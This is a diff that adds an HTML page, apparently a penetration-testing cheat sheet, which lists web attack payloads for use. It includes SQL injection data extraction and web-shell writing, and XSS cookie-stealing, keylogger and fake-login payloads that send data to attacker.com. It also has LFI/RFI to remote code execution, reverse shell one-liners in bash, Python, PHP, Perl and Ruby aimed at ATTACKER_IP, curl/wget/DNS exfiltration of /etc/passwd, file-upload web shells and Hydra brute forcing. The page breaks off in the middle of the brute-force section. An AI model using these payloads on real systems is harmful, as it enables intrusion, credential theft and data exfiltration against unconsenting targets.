@@ -1,0 +1,1760 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Testing Reference</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Consolas', 'Monaco', monospace;
+            background: #0d1117;
+            color: #c9d1d9;
+            line-height: 1.6;
+        }
+        .topbar {
+            background: #161b22;
+            border-bottom: 1px solid #21262d;
+            padding: 12px 20px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .topbar h1 {
+            color: #c9d1d9;
+            font-size: 1.2em;
+            font-weight: 400;
+        }
+        .nav {
+            background: #161b22;
+            padding: 10px 20px;
+            border-bottom: 1px solid #21262d;
+        }
+        .nav a {
+            color: #58a6ff;
+            text-decoration: none;
+            margin-right: 15px;
+            font-size: 0.9em;
+        }
+        .nav a:hover {
+            text-decoration: underline;
+        }
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .section {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            margin-bottom: 16px;
+            padding: 20px;
+        }
+        .section-title {
+            color: #58a6ff;
+            font-size: 1.4em;
+            margin-bottom: 15px;
+            border-bottom: 1px solid #21262d;
+            padding-bottom: 8px;
+        }
+        .subsection {
+            margin-bottom: 20px;
+        }
+        .subsection-title {
+            color: #79c0ff;
+            font-size: 1.1em;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+        .code-block {
+            background: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 4px;
+            padding: 12px;
+            margin: 8px 0;
+            overflow-x: auto;
+            font-size: 0.85em;
+            white-space: pre;
+        }
+        .code-block code {
+            color: #79c0ff;
+        }
+        .note {
+            background: #1f2937;
+            border-left: 3px solid #58a6ff;
+            padding: 10px;
+            margin: 10px 0;
+            font-size: 0.9em;
+        }
+        .warning {
+            background: #2d1f1c;
+            border-left: 3px solid #f85149;
+            padding: 10px;
+            margin: 10px 0;
+            font-size: 0.9em;
+        }
+        .tip {
+            background: #1f2d1c;
+            border-left: 3px solid #3fb950;
+            padding: 10px;
+            margin: 10px 0;
+            font-size: 0.9em;
+        }
+    </style>
+</head>
+<body>
+    <div class="topbar">
+        <h1>📚 Security Testing Reference - Module A</h1>
+    </div>
+    
+    <div class="nav">
+        <a href="#sqli">SQL Injection</a>
+        <a href="#xss">XSS</a>
+        <a href="#lfi">File Inclusion</a>
+        <a href="#cmdi">Command Injection</a>
+        <a href="#upload">File Upload</a>
+        <a href="#auth">Authentication</a>
+        <a href="#idor">IDOR</a>
+        <a href="#ssrf">SSRF</a>
+        <a href="#crypto">Crypto</a>
+        <a href="#reverse">Reverse Eng</a>
+        <a href="#forensics">Forensics</a>
+        <a href="#osint">OSINT</a>
+    </div>
+    
+    <div class="container">
+        
+        <!-- SQL INJECTION -->
+        <div class="section" id="sqli">
+            <div class="section-title">🔍 SQL Injection</div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Detection Payloads</div>
+                <div class="code-block"><code>' OR '1'='1'--
+admin' OR '1'='1'--
+" OR "1"="1"--
+') OR ('1'='1'--
+' OR 1=1--
+" OR 1=1--
+
+# Boolean tests
+?id=1 AND 1=1  (True - normal response)
+?id=1 AND 1=2  (False - different response)
+
+# Error-based
+?id=1'
+?id=1"
+?id=1`</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">UNION SELECT Methodology</div>
+                <div class="code-block"><code># Step 1: Determine number of columns
+' ORDER BY 1--  ✓
+' ORDER BY 2--  ✓
+' ORDER BY 3--  ✗ (error means 2 columns)
+
+# Alternative method
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--  ✗ (error means 2 columns)
+
+# Step 2: Find injectable columns
+' UNION SELECT 1,2--
+' UNION SELECT 'a','b'--
+# Check which number appears on page
+
+# Step 3: Extract database version
+' UNION SELECT NULL,version()--
+' UNION SELECT NULL,@@version--
+
+# MySQL specific
+' UNION SELECT NULL,@@datadir--
+' UNION SELECT NULL,@@hostname--
+
+# Step 4: Get current database
+' UNION SELECT NULL,database()--
+
+# Step 5: Get current user
+' UNION SELECT NULL,user()--
+' UNION SELECT NULL,current_user()--
+
+# Step 6: List all databases
+' UNION SELECT NULL,schema_name FROM information_schema.schemata--
+' UNION SELECT NULL,GROUP_CONCAT(schema_name) FROM information_schema.schemata--
+
+# Step 7: List tables in database
+' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema='database_name'--
+' UNION SELECT NULL,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--
+
+# Step 8: List columns in table
+' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT NULL,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--
+
+# Step 9: Extract data
+' UNION SELECT username,password FROM users--
+' UNION SELECT NULL,CONCAT(username,':',password) FROM users--
+' UNION SELECT NULL,GROUP_CONCAT(username,':',password) FROM users--
+
+# Step 10: Read files (MySQL)
+' UNION SELECT NULL,LOAD_FILE('/etc/passwd')--
+' UNION SELECT NULL,LOAD_FILE('C:/Windows/System32/drivers/etc/hosts')--
+
+# Step 11: Write files (MySQL)
+' UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
+' UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>' INTO DUMPFILE '/var/www/html/shell.php'--</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Blind SQL Injection</div>
+                <div class="code-block"><code># Boolean-based (response changes)
+' AND 1=1--  (True - normal page)
+' AND 1=2--  (False - different page)
+
+# Check database name length
+' AND LENGTH(database())=1--  (False)
+' AND LENGTH(database())=5--  (True)
+
+# Extract database name character by character
+' AND SUBSTRING(database(),1,1)='a'--  (False)
+' AND SUBSTRING(database(),1,1)='s'--  (True)
+' AND SUBSTRING(database(),2,1)='h'--  (True)
+
+# Check if table exists
+' AND (SELECT COUNT(*) FROM users)>0--
+
+# Check column exists
+' AND (SELECT COUNT(password) FROM users)>0--
+
+# Extract data character by character
+' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
+
+# Time-based (response delay)
+# MySQL
+' AND IF(1=1,SLEEP(5),0)--
+' AND IF(LENGTH(database())=5,SLEEP(5),0)--
+' AND IF(SUBSTRING(database(),1,1)='s',SLEEP(5),0)--
+
+# PostgreSQL
+' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 0 END)--
+
+# MSSQL
+'; WAITFOR DELAY '00:00:05'--
+
+# Oracle
+' AND CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END--</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">sqlmap Automation</div>
+                <div class="code-block"><code># Basic scan
+sqlmap -u "http://target.com/page.php?id=1" --batch
+
+# List databases
+sqlmap -u "http://target.com/page.php?id=1" --dbs
+
+# Current database
+sqlmap -u "http://target.com/page.php?id=1" --current-db
+
+# List tables
+sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
+
+# List columns
+sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --columns
+
+# Dump table
+sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump
+
+# Dump all
+sqlmap -u "http://target.com/page.php?id=1" --dump-all
+
+# POST requests
+sqlmap -u "http://target.com/login.php" --data="username=admin&password=123" --batch
+
+# With cookies
+sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123" --batch
+
+# Request file
+sqlmap -r request.txt --batch
+
+# Get OS shell
+sqlmap -u "http://target.com/page.php?id=1" --os-shell
+
+# Read file
+sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"
+
+# Write file
+sqlmap -u "http://target.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
+
+# Risk and level
+sqlmap -u "URL" --risk=3 --level=5
+
+# Specific technique
+sqlmap -u "URL" --technique=U  # UNION only
+sqlmap -u "URL" --technique=B  # Boolean-based only
+sqlmap -u "URL" --technique=T  # Time-based only
+
+# Tamper scripts (WAF bypass)
+sqlmap -u "URL" --tamper=space2comment
+sqlmap -u "URL" --tamper=between,randomcase</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">WAF Bypass Techniques</div>
+                <div class="code-block"><code># Case variation
+' Or '1'='1'--
+' oR '1'='1'--
+' OR '1'='1'--
+
+# Comment injection
+'/**/OR/**/1=1--
+'/*!OR*/1=1--
+'/*! OR */1=1--
+
+# Encoding
+# URL encode
+%27%20OR%20%271%27=%271
+# Double URL encode
+%2527%2520OR%2520%25271%2527%253D%25271
+
+# HTML entity
+&#39; OR &#39;1&#39;=&#39;1
+
+# Hex encode
+0x27204f5220273127203d202731
+
+# Space bypass
+'+OR+1=1--
+'%09OR%091=1--  (tab)
+'%0AOR%0A1=1--  (newline)
+'%0DOR%0D1=1--  (carriage return)
+
+# String concatenation
+# MySQL
+'||'1'||'='||'1
+# MSSQL
+'+'1'+'='+'1
+
+# Alternative operators
+' OR 1 LIKE 1--
+' OR 1 BETWEEN 0 AND 2--
+
+# Alternative syntax
+' OR BINARY 0x31=0x31--
+' OR 'a'='a' AND 'b'='b'--</code></div>
+            </div>
+            
+            <div class="tip">
+                <strong>💡 Pro Tips:</strong>
+                <ul style="margin: 5px 0 0 20px;">
+                    <li>Always test both GET and POST parameters</li>
+                    <li>Check cookies, headers (User-Agent, Referer)</li>
+                    <li>Try different comment styles: --, #, /**/, ;%00</li>
+                    <li>If numbers work, try UNION SELECT 1,2,3...</li>
+                    <li>If strings work, try UNION SELECT 'a','b','c'...</li>
+                </ul>
+            </div>
+        </div>
+        
+        <!-- XSS -->
+        <div class="section" id="xss">
+            <div class="section-title">⚡ Cross-Site Scripting (XSS)</div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Basic Payloads</div>
+                <div class="code-block"><code>&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;script&gt;alert(document.domain)&lt;/script&gt;
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+&lt;img src=x onerror="alert(1)"&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;body onload=alert(1)&gt;
+&lt;iframe src="javascript:alert(1)"&gt;
+&lt;input onfocus=alert(1) autofocus&gt;
+&lt;select onfocus=alert(1) autofocus&gt;
+&lt;textarea onfocus=alert(1) autofocus&gt;
+&lt;video src=x onerror=alert(1)&gt;
+&lt;audio src=x onerror=alert(1)&gt;</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Filter Bypass</div>
+                <div class="code-block"><code># Case variation
+&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
+&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;
+
+# HTML entities
+&lt;img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;"&gt;
+
+# Null bytes
+&lt;script&gt;%00alert(1)&lt;/script&gt;
+
+# Alternative tags
+&lt;svg/onload=alert(1)&gt;
+&lt;svg////onload=alert(1)&gt;
+
+# Backticks
+&lt;img src=x onerror=alert`1`&gt;
+
+# Base64
+&lt;script&gt;eval(atob('YWxlcnQoMSk='))&lt;/script&gt;
+
+# Unicode
+\u003cscript\u003ealert(1)\u003c/script\u003e
+
+# Hex
+\x3cscript\x3ealert(1)\x3c/script\x3e
+
+# Without parentheses
+&lt;script&gt;onerror=alert;throw 1&lt;/script&gt;
+
+# Without space
+&lt;svg/onload=alert(1)&gt;
+
+# Without quotes
+&lt;img src=x onerror=alert(String.fromCharCode(88,83,83))&gt;</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Cookie Stealing</div>
+                <div class="code-block"><code># Using fetch
+&lt;script&gt;
+fetch('http://attacker.com/steal?c='+document.cookie);
+&lt;/script&gt;
+
+# Using Image
+&lt;script&gt;
+new Image().src='http://attacker.com/steal?c='+document.cookie;
+&lt;/script&gt;
+
+# Using XMLHttpRequest
+&lt;script&gt;
+var xhr=new XMLHttpRequest();
+xhr.open('GET','http://attacker.com/steal?c='+document.cookie);
+xhr.send();
+&lt;/script&gt;
+
+# One-liner
+&lt;img src=x onerror="this.src='http://attacker.com/?c='+document.cookie"&gt;</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Keylogger</div>
+                <div class="code-block"><code>&lt;script&gt;
+document.onkeypress = function(e) {
+  fetch('http://attacker.com/log?key='+e.key);
+}
+&lt;/script&gt;
+
+&lt;script&gt;
+var keys='';
+document.onkeypress = function(e) {
+  keys += e.key;
+  if(keys.length > 20) {
+    fetch('http://attacker.com/log?data='+keys);
+    keys = '';
+  }
+}
+&lt;/script&gt;</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Phishing / Credential Harvesting</div>
+                <div class="code-block"><code>&lt;script&gt;
+document.body.innerHTML='&lt;h1&gt;Session Expired&lt;/h1&gt;&lt;form action="http://attacker.com/steal"&gt;&lt;input placeholder="Username" name="user"&gt;&lt;input type="password" placeholder="Password" name="pass"&gt;&lt;input type="submit" value="Login"&gt;&lt;/form&gt;';
+&lt;/script&gt;
+
+&lt;script&gt;
+document.write('&lt;h3&gt;Please re-authenticate&lt;/h3&gt;&lt;form action=http://attacker.com/steal&gt;&lt;input name=user&gt;&lt;input type=password name=pass&gt;&lt;input type=submit&gt;&lt;/form&gt;');
+&lt;/script&gt;</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Page Defacement</div>
+                <div class="code-block"><code>&lt;script&gt;
+document.body.innerHTML='&lt;h1&gt;Hacked by XSS&lt;/h1&gt;';
+&lt;/script&gt;
+
+&lt;script&gt;
+document.body.style.background='red';
+document.body.innerHTML='&lt;h1 style="color:white"&gt;PWNED&lt;/h1&gt;';
+&lt;/script&gt;</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">BeEF Hook</div>
+                <div class="code-block"><code>&lt;script src="http://attacker.com:3000/hook.js"&gt;&lt;/script&gt;</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Blind XSS Payloads</div>
+                <div class="code-block"><code># For admin panels, emails, logs
+&lt;script src=http://attacker.com/xss.js&gt;&lt;/script&gt;
+
+# XSS Hunter payload
+&lt;script src=https://yourid.xss.ht&gt;&lt;/script&gt;
+
+# Callback payload
+&lt;img src=x onerror="fetch('http://attacker.com/callback?url='+location.href)"&gt;</code></div>
+            </div>
+            
+            <div class="tip">
+                <strong>💡 Where to test XSS:</strong>
+                <ul style="margin: 5px 0 0 20px;">
+                    <li>Search boxes</li>
+                    <li>Comment fields</li>
+                    <li>User profile (name, bio, etc.)</li>
+                    <li>URL parameters</li>
+                    <li>File upload (filename)</li>
+                    <li>Error messages</li>
+                </ul>
+            </div>
+        </div>
+        
+        <!-- LFI/RFI -->
+        <div class="section" id="lfi">
+            <div class="section-title">📂 File Inclusion (LFI/RFI)</div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Local File Inclusion (LFI)</div>
+                <div class="code-block"><code># Basic traversal
+../../../../etc/passwd
+../../../../etc/shadow
+../../../../etc/hosts
+../../../../etc/issue
+../../../../etc/group
+../../../../proc/self/environ
+../../../../proc/version
+../../../../proc/cmdline
+
+# Windows
+..\..\..\..\windows\system32\drivers\etc\hosts
+..\..\..\..\windows\win.ini
+..\..\..\..\boot.ini
+
+# Logs
+../../../../var/log/apache2/access.log
+../../../../var/log/apache2/error.log
+../../../../var/log/nginx/access.log
+../../../../var/log/nginx/error.log
+../../../../var/log/auth.log
+../../../../var/log/syslog
+
+# Apache/Nginx config
+../../../../etc/apache2/apache2.conf
+../../../../etc/nginx/nginx.conf
+../../../../usr/local/apache2/conf/httpd.conf</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Filter Bypass</div>
+                <div class="code-block"><code># Double encoding
+..%252f..%252f..%252fetc%252fpasswd
+
+# Path variations
+....//....//....//etc/passwd
+....\/....\/....\/etc/passwd
+..;/..;/..;/etc/passwd
+
+# Null byte (PHP < 5.3)
+../../../../etc/passwd%00
+../../../../etc/passwd%00.jpg
+
+# URL encoding
+..%2f..%2f..%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+
+# Unicode/UTF-8
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+..%e0%80%af..%e0%80%af..%e0%80%afetc%e0%80%afpasswd</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">PHP Wrappers</div>
+                <div class="code-block"><code># php://filter (read PHP source)
+php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=config.php
+php://filter/convert.base64-encode/resource=../config.php
+
+# Decode result
+echo "PD9waHAK..." | base64 -d
+
+# php://input (POST data execution)
+http://target.com/page.php?file=php://input
+POST data: &lt;?php system($_GET['cmd']); ?&gt;
+
+# php://data
+php://data://text/plain,&lt;?php system($_GET['cmd']); ?&gt;
+php://data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+
+# zip:// wrapper
+echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php
+zip shell.zip shell.php
+http://target.com/page.php?file=zip://shell.zip%23shell.php&cmd=id
+
+# phar:// wrapper
+Similar to zip://
+
+# expect:// (if enabled)
+expect://id
+expect://ls</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">LFI to RCE</div>
+                <div class="code-block"><code># Method 1: Log Poisoning (Apache)
+# Step 1: Inject PHP into User-Agent
+curl http://target.com -A "&lt;?php system(\$_GET['cmd']); ?&gt;"
+
+# Step 2: Include log file
+http://target.com/page.php?file=../../../../var/log/apache2/access.log&cmd=id
+
+# Method 2: /proc/self/environ
+curl http://target.com -A "&lt;?php system(\$_GET['cmd']); ?&gt;"
+http://target.com/page.php?file=../../../../proc/self/environ&cmd=whoami
+
+# Method 3: PHP Session files
+# Sessions stored in /var/lib/php/sessions/sess_[PHPSESSID]
+# Inject PHP into session variable, then include session file
+
+# Method 4: Upload + LFI
+# Upload image with PHP code in metadata
+# Use LFI to include uploaded file
+
+# Method 5: /tmp files
+http://target.com/page.php?file=/tmp/phpXXXXXX</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Remote File Inclusion (RFI)</div>
+                <div class="code-block"><code># Basic RFI
+http://target.com/page.php?file=http://attacker.com/shell.php
+http://target.com/page.php?file=http://attacker.com/shell.txt
+
+# shell.php content:
+&lt;?php system($_GET['cmd']); ?&gt;
+
+# Execute command
+http://target.com/page.php?file=http://attacker.com/shell.php&cmd=whoami
+
+# Using FTP
+http://target.com/page.php?file=ftp://attacker.com/shell.php
+
+# Using SMB (Windows)
+http://target.com/page.php?file=\\attacker.com\share\shell.php
+
+# Bypass with null byte
+http://target.com/page.php?file=http://attacker.com/shell.txt%00
+
+# Bypass with ?
+http://target.com/page.php?file=http://attacker.com/shell.txt?</code></div>
+            </div>
+            
+            <div class="tip">
+                <strong>💡 Files to check:</strong>
+                <ul style="margin: 5px 0 0 20px;">
+                    <li>/etc/passwd - User accounts</li>
+                    <li>/etc/shadow - Password hashes (need root)</li>
+                    <li>/proc/self/environ - Environment variables</li>
+                    <li>/var/log/apache2/access.log - Web logs</li>
+                    <li>config.php, database.php - DB credentials</li>
+                </ul>
+            </div>
+        </div>
+        
+        <!-- COMMAND INJECTION -->
+        <div class="section" id="cmdi">
+            <div class="section-title">💻 Command Injection</div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Basic Injection Characters</div>
+                <div class="code-block"><code>; whoami
+| whoami
+& whoami
+&& whoami
+|| whoami
+`whoami`
+$(whoami)
+
+# Examples
+ping 127.0.0.1; whoami
+ping 127.0.0.1 | whoami
+ping 127.0.0.1 & whoami</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Filter Bypass</div>
+                <div class="code-block"><code># Variable substitution
+who$()ami
+w$()ho$()ami
+
+# Backslash
+w\ho\am\i
+
+# Quotes
+who'a'mi
+who"a"mi
+
+# Brace expansion
+{cat,/etc/passwd}
+
+# $IFS (Internal Field Separator)
+cat$IFS/etc/passwd
+cat${IFS}/etc/passwd
+
+# Redirection
+cat</etc/passwd
+
+# Wildcard
+cat$IFS/et?/passw?
+
+# Tab character
+cat%09/etc/passwd
+
+# Newline
+cat%0a/etc/passwd</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Reverse Shells</div>
+                <div class="code-block"><code># Listener on attacker machine
+nc -lvnp 4444
+
+# Bash
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
+
+# Netcat
+nc ATTACKER_IP 4444 -e /bin/bash
+nc -e /bin/sh ATTACKER_IP 4444
+
+# Netcat without -e
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
+
+# Python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"]);'
+
+# Python3
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"]);'
+
+# PHP
+php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
+
+# Perl
+perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
+
+# Ruby
+ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'
+
+# Telnet
+TF=$(mktemp -u);mkfifo $TF && telnet ATTACKER_IP 4444 0<$TF | /bin/bash 1>$TF</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Data Exfiltration</div>
+                <div class="code-block"><code># Using curl
+; curl http://attacker.com/$(whoami)
+; curl http://attacker.com/ -d "data=$(cat /etc/passwd)"
+; curl http://attacker.com/ -d "data=$(cat /etc/passwd | base64)"
+
+# Using wget
+; wget http://attacker.com/?data=$(cat /etc/passwd | base64)
+
+# Using DNS
+; nslookup $(whoami).attacker.com
+
+# Using ping
+; ping -c 1 $(whoami | base64).attacker.com</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Useful Commands</div>
+                <div class="code-block"><code># System info
+whoami
+id
+hostname
+uname -a
+cat /etc/issue
+cat /etc/*-release
+
+# Network
+ifconfig
+ip addr
+ip route
+netstat -tulpn
+ss -tulpn
+
+# Users
+cat /etc/passwd
+cat /etc/shadow
+cat /etc/group
+w
+last
+
+# Processes
+ps aux
+ps -ef
+top
+
+# Files
+ls -la
+find / -name "*.conf" 2>/dev/null
+find / -perm -4000 2>/dev/null  # SUID files
+
+# Writable directories
+find / -writable -type d 2>/dev/null</code></div>
+            </div>
+        </div>
+        <div class="section" id="upload">
+            <div class="section-title">📤 File Upload Vulnerabilities</div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Extension Bypass</div>
+                <div class="code-block"><code># Double extension
+shell.php.jpg
+shell.jpg.php
+
+# Case variation
+shell.pHp
+shell.PhP
+shell.PHP
+
+# Null byte (old PHP)
+shell.php%00.jpg
+shell.php\x00.jpg
+
+# Special characters
+shell.php.....
+shell.php%20
+shell.php::$DATA (Windows)
+
+# Alternative extensions
+shell.phtml
+shell.php3
+shell.php4
+shell.php5
+shell.phps
+shell.phar
+
+# Blacklist bypass
+shell.PhP5
+shell.shtml
+shell.asa
+shell.cer
+shell.asax</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">MIME Type Bypass</div>
+                <div class="code-block"><code># Change Content-Type in request
+Content-Type: image/jpeg
+Content-Type: image/png
+Content-Type: image/gif
+
+# But file content is PHP:
+&lt;?php system($_GET['cmd']); ?&gt;</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Magic Bytes (File Signature)</div>
+                <div class="code-block"><code># GIF header + PHP
+echo "GIF89a" > shell.php
+echo "&lt;?php system(\$_GET['cmd']); ?&gt;" >> shell.php
+
+# Or in one line
+echo "GIF89a&lt;?php system(\$_GET['cmd']); ?&gt;" > shell.php
+
+# PNG header
+echo -e "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A&lt;?php system(\$_GET['cmd']); ?&gt;" > shell.php
+
+# JPEG header
+printf '\xFF\xD8\xFF\xE0&lt;?php system($_GET["cmd"]); ?&gt;' > shell.php
+
+# Common magic bytes:
+# PNG: 89 50 4E 47 0D 0A 1A 0A
+# JPEG: FF D8 FF E0
+# GIF: 47 49 46 38 39 61
+# ZIP: 50 4B 03 04
+# PDF: 25 50 44 46</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Polyglot Files</div>
+                <div class="code-block"><code># Valid image + PHP code
+# Create with exiftool
+exiftool -Comment='&lt;?php system($_GET["cmd"]); ?&gt;' image.jpg
+
+# Or manually add to end of valid image
+cat valid-image.jpg > shell.jpg
+echo "&lt;?php system(\$_GET['cmd']); ?&gt;" >> shell.jpg</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">.htaccess Upload</div>
+                <div class="code-block"><code># Upload .htaccess file with content:
+AddType application/x-httpd-php .jpg
+AddType application/x-httpd-php .png
+
+# Then upload shell.jpg containing PHP code
+
+# Alternative .htaccess
+&lt;FilesMatch "shell.jpg"&gt;
+SetHandler application/x-httpd-php
+&lt;/FilesMatch&gt;</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Web.config Upload (IIS)</div>
+                <div class="code-block"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;configuration&gt;
+   &lt;system.webServer&gt;
+      &lt;handlers accessPolicy="Read, Script, Write"&gt;
+         &lt;add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" /&gt;
+      &lt;/handlers&gt;
+      &lt;security&gt;
+         &lt;requestFiltering&gt;
+            &lt;fileExtensions&gt;
+               &lt;remove fileExtension=".config" /&gt;
+            &lt;/fileExtensions&gt;
+            &lt;hiddenSegments&gt;
+               &lt;remove segment="web.config" /&gt;
+            &lt;/hiddenSegments&gt;
+         &lt;/requestFiltering&gt;
+      &lt;/security&gt;
+   &lt;/system.webServer&gt;
+&lt;/configuration&gt;
+&lt;%@ Language=VBScript %&gt;
+&lt;% response.write("&lt;pre&gt;")
+Set objShell = CreateObject("WScript.Shell")
+Set objExec = objShell.Exec("cmd /c " & Request.QueryString("cmd"))
+response.write(objExec.StdOut.ReadAll())
+response.write("&lt;/pre&gt;") %&gt;</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">ZIP Upload (Path Traversal)</div>
+                <div class="code-block"><code># Create zip with path traversal
+echo '&lt;?php system($_GET["cmd"]); ?&gt;' > shell.php
+zip shell.zip shell.php
+# Manually edit zip to change filename to: ../../../../var/www/html/shell.php
+
+# Using evilarc
+python evilarc.py shell.php -o unix -d 4 -p var/www/html/</code></div>
+            </div>
+            
+            <div class="tip">
+                <strong>💡 Where to find uploaded files:</strong>
+                <ul style="margin: 5px 0 0 20px;">
+                    <li>/uploads/</li>
+                    <li>/upload/</li>
+                    <li>/files/</li>
+                    <li>/images/</li>
+                    <li>/media/</li>
+                    <li>/assets/</li>
+                    <li>/tmp/</li>
+                    <li>/var/www/html/uploads/</li>
+                </ul>
+            </div>
+        </div>
+        
+        <!-- AUTHENTICATION BYPASS -->
+        <div class="section" id="auth">
+            <div class="section-title">🔓 Authentication Bypass</div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Default Credentials</div>
+                <div class="code-block"><code>admin:admin
+admin:password
+admin:admin123
+admin:root
+root:root
+root:toor
+administrator:administrator
+guest:guest
+admin:
+root:
+user:user</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">SQL Injection Login Bypass</div>
+                <div class="code-block"><code># Username field
+admin' OR '1'='1'--
+admin' OR 1=1--
+admin'--
+admin' #
+' OR '1'='1'--
+' OR 1=1--
+'--
+' #
+admin' OR '1'='1
+'or 1=1--
+
+# Both fields
+admin:admin' OR '1'='1'--
+' OR '1'='1':' OR '1'='1</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Password Reset Token Manipulation</div>
+                <div class="code-block"><code># Weak token generation
+# Predictable: timestamp, username hash, sequential
+# Try to generate valid token for other users
+
+# Example: token based on timestamp
+# User A gets token: abc123 at 10:00:00
+# Attacker tries tokens around that time for User B
+
+# Token reuse
+# Use same token multiple times
+# Use expired tokens</code></div>
+            </div>
+            
+            <div class="subsection">
+                <div class="subsection-title">Brute Force</div>
+                <div class="code-block"><code># Hydra - HTTP POST form
+hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
+
+# Hydra - HTTP Basic Auth
+hydra -l admin -P rockyou.txt target.com http-get /admin/
+
